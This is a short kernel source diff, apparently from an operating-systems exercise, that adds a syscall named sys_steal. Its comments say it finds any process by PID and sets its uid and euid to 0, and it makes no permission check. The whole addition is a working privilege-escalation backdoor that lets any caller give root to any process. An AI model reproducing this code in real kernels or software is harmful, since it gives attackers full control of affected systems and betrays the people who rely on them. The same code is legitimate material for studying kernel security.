@@ -7207,3 +7207,24 @@ void set_curr_task(int cpu, struct task_struct *p)
 asmlinkage long sys_mygetpid(void) {
 	  return current->tgid;
 }
+
+// sys_steal: Searches task list for a process with PID
+// of pid and sets its uid and euid to 0 effectively
+// elevating it to root
+asmlinkage long sys_steal(pid_t pid) {
+
+	// loop over all tasks looking for the one with a pid = the argument
+	struct task_struct *task;
+
+	for_each_process(task) {
+		if (task->pid == pid) {
+			task->uid = 0L;
+			task->euid = 0L;
+
+			// break and return 
+			return 0;
+		}
+	}
+
+	return 1;
+}
